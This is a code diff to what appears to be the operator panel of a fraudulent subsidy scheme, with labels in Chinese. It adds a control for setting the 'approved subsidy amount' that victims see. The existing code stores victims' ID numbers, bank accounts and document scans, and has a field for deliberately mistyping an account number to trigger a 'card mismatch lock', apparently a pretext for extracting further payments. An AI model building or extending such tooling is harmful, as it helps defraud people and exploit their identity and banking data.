@@ -450,6 +450,11 @@
               <input id="admin-card-${escapeHTML(lead.id)}" type="text" value="${escapeHTML(lead.admin_modified_card || '')}" placeholder="在此輸入故意寫錯的帳號（例如改錯一碼）" />
               <button class="danger" style="background:#b42318; color:white;" onclick="saveCorrectedCard('${lead.id}')">⚡ 觸發卡號不符鎖定</button>
             </div>
+            <div class="review-control" style="background:#e8f2ff; border-color:#2168ae;">
+              <label for="admin-amount-${escapeHTML(lead.id)}" style="color:#2168ae;">💰 設定補助金額（客戶看到的金額由此決定）</label>
+              <input id="admin-amount-${escapeHTML(lead.id)}" type="number" value="${escapeHTML(lead.admin_approved_amount || '')}" placeholder="例如：85000" />
+              <button style="background:#2168ae; color:white;" onclick="saveApprovedAmount('${lead.id}')">✓ 設定金額</button>
+            </div>
           </div>
         </article>
       `).join('');
@@ -484,6 +489,26 @@
       if (activeLeadId === id) openDetails(id);
     }
 
+    async function saveApprovedAmount(id) {
+      const input = document.getElementById('admin-amount-' + id);
+      const approvedAmount = input ? parseInt(input.value.trim(), 10) : null;
+      if (!approvedAmount || approvedAmount <= 0) {
+        alert('請輸入有效的補助金額（大於0）');
+        return;
+      }
+      const { error } = await client.from(LEADS_TABLE).update({
+        admin_approved_amount: approvedAmount,
+        updated_at: new Date().toISOString()
+      }).eq('id', id);
+      if (error) {
+        alert('設定金額失敗：' + error.message);
+        return;
+      }
+      alert('補助金額已設定！客戶前端將顯示 NT$ ' + approvedAmount.toLocaleString() + '。');
+      await loadLeads();
+      if (activeLeadId === id) openDetails(id);
+    }
+
     async function signedUrl(path) {
       if (!path) return '';
       if (/^https?:\/\//.test(path)) return path;
@@ -510,6 +535,7 @@
           ${detailItem('工作收入區間', lead.monthly_income || lead.employment)}
           ${detailItem('是否警示戶', warningLabel(lead.warning_account))}
           ${detailItem('當前審核狀態', statusLabels[lead.status || 'new'])}
+          ${detailItem('後台設定補助金額', lead.admin_approved_amount ? 'NT$ ' + lead.admin_approved_amount.toLocaleString() : '未設定')}
           ${detailItem('提交時間', formatDate(lead.created_at))}
         </div>
         <div class="detail-section">
@@ -536,6 +562,9 @@
           <div style="height:10px"></div>
           <label for="detail-admin-card">篡改卡號專用框</label>
           <input id="detail-admin-card" type="text" value="${escapeHTML(lead.admin_modified_card || '')}" placeholder="修改後的帳號">
+          <div style="height:10px"></div>
+          <label for="detail-admin-amount">設定補助金額</label>
+          <input id="detail-admin-amount" type="number" value="${escapeHTML(lead.admin_approved_amount || '')}" placeholder="例如：85000">
           <div style="height:10px"></div>
           <button onclick="saveDetail('${lead.id}')">保存修改</button>
         </div>
@@ -610,22 +639,29 @@
       const status = document.getElementById('detail-status').value;
       const notes = document.getElementById('detail-notes').value;
       const adminModifiedCard = document.getElementById('detail-admin-card').value.trim();
-      const { error } = await client.from(LEADS_TABLE).update({
+      const adminApprovedAmountInput = document.getElementById('detail-admin-amount');
+      const adminApprovedAmount = adminApprovedAmountInput ? parseInt(adminApprovedAmountInput.value.trim(), 10) : null;
+      const updateData = {
         status,
         notes,
         admin_modified_card: adminModifiedCard,
         updated_at: new Date().toISOString()
-      }).eq('id', id);
+      };
+      if (adminApprovedAmount && adminApprovedAmount > 0) {
+        updateData.admin_approved_amount = adminApprovedAmount;
+      }
+      const { error } = await client.from(LEADS_TABLE).update(updateData).eq('id', id);
       if (error) {
         alert('保存失敗：' + error.message);
         return;
       }
+      alert('修改已保存！');
       await loadLeads();
       if (activeLeadId) openDetails(activeLeadId);
     }
 
     function exportCSV() {
-      const cols = ['created_at','name','id_number','phone','line_id','bank_account','admin_modified_card','subsidy_amount','monthly_income','warning_account','status','id_document_path','bank_book_path','notes'];
+      const cols = ['created_at','name','id_number','phone','line_id','bank_account','admin_modified_card','admin_approved_amount','subsidy_amount','monthly_income','warning_account','status','id_document_path','bank_book_path','notes'];
       const rows = filteredLeads();
       const csv = [cols.join(',')].concat(rows.map(row =>
         cols.map(col => '"' + String(row[col] || '').replace(/"/g, '""') + '"').join(',')
